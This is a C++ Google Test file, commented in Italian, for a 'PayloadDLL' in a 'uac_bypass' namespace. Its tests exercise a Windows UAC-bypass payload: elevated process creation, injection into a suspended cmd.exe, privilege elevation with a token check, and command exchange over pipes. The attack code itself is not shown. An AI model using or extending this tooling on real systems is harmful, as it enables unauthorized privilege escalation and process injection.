#include <gtest/gtest.h>
#include "../include/PayloadDLL.h"
#include <memory>
#include <thread>
#include <chrono>

using namespace uac_bypass;

class PayloadTest : public ::testing::Test {
protected:
    void SetUp() override {
        payload = &PayloadDLL::getInstance();
    }

    void TearDown() override {
        payload->cleanup();
    }

    PayloadDLL* payload;
};

// Test inizializzazione
TEST_F(PayloadTest, Initialization) {
    EXPECT_TRUE(payload->initialize());
}

// Test comunicazione pipe
TEST_F(PayloadTest, PipeCommunication) {
    ASSERT_TRUE(payload->initialize());
    
    const DWORD testStatus = 0x1234;
    EXPECT_TRUE(payload->sendStatus(testStatus));
    
    // Simula ricezione comandi
    std::thread receiver([this]() {
        EXPECT_TRUE(payload->receiveCommands());
    });
    
    // Attendi completamento
    if (receiver.joinable()) {
        receiver.join();
    }
}

// Test validazione ambiente
TEST_F(PayloadTest, EnvironmentValidation) {
    ASSERT_TRUE(payload->initialize());
    
    // Test ambiente Windows
    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    ASSERT_TRUE(hNtdll != nullptr);
    
    auto RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    ASSERT_TRUE(RtlGetVersion != nullptr);
    
    ASSERT_EQ(0, RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo));
    EXPECT_GE(osInfo.dwMajorVersion, 10);
}

// Test creazione processo elevato
TEST_F(PayloadTest, ElevatedProcessCreation) {
    ASSERT_TRUE(payload->initialize());
    
    // Test creazione processo cmd.exe
    std::wstring cmdLine = L"cmd.exe /c exit";
    EXPECT_TRUE(payload->createElevatedProcess(cmdLine));
}

// Test iniezione
TEST_F(PayloadTest, ProcessInjection) {
    ASSERT_TRUE(payload->initialize());
    
    // Crea processo di test
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    ASSERT_TRUE(CreateProcessW(NULL, (LPWSTR)L"cmd.exe /c timeout 3",
        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi));
    
    // Test iniezione
    EXPECT_TRUE(payload->injectIntoTarget(pi.hProcess));
    
    // Cleanup
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Test verifica integrità
TEST_F(PayloadTest, IntegrityCheck) {
    ASSERT_TRUE(payload->initialize());
    
    // Verifica firma modulo corrente
    WCHAR modulePath[MAX_PATH];
    ASSERT_TRUE(GetModuleFileNameW(NULL, modulePath, MAX_PATH));
    
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = modulePath;
    
    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;
    
    LONG result = WinVerifyTrust(NULL, &actionId, &trustData);
    
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);
    
    EXPECT_EQ(ERROR_SUCCESS, result);
}

// Test elevazione privilegi
TEST_F(PayloadTest, PrivilegeElevation) {
    ASSERT_TRUE(payload->initialize());
    
    // Test elevazione
    EXPECT_TRUE(payload->elevatePrivileges());
    
    // Verifica privilegi
    HANDLE hToken;
    ASSERT_TRUE(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken));
    
    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    ASSERT_TRUE(GetTokenInformation(hToken, TokenElevation, &elevation,
        sizeof(elevation), &size));
    
    EXPECT_TRUE(elevation.TokenIsElevated);
    
    CloseHandle(hToken);
}

// Test gestione errori
TEST_F(PayloadTest, ErrorHandling) {
    // Test inizializzazione multipla
    EXPECT_TRUE(payload->initialize());
    EXPECT_TRUE(payload->initialize());  // Dovrebbe ritornare true se già inizializzato
    
    // Test cleanup e reinizializzazione
    payload->cleanup();
    EXPECT_TRUE(payload->initialize());
    
    // Test operazioni senza inizializzazione
    payload->cleanup();
    EXPECT_FALSE(payload->elevatePrivileges());
    EXPECT_FALSE(payload->sendStatus(0));
    EXPECT_FALSE(payload->receiveCommands());
}

// Test stress
TEST_F(PayloadTest, StressTest) {
    ASSERT_TRUE(payload->initialize());
    
    // Test operazioni multiple
    const int iterations = 100;
    for (int i = 0; i < iterations; i++) {
        EXPECT_TRUE(payload->sendStatus(i));
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main(int argc, char **argv) {
    testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}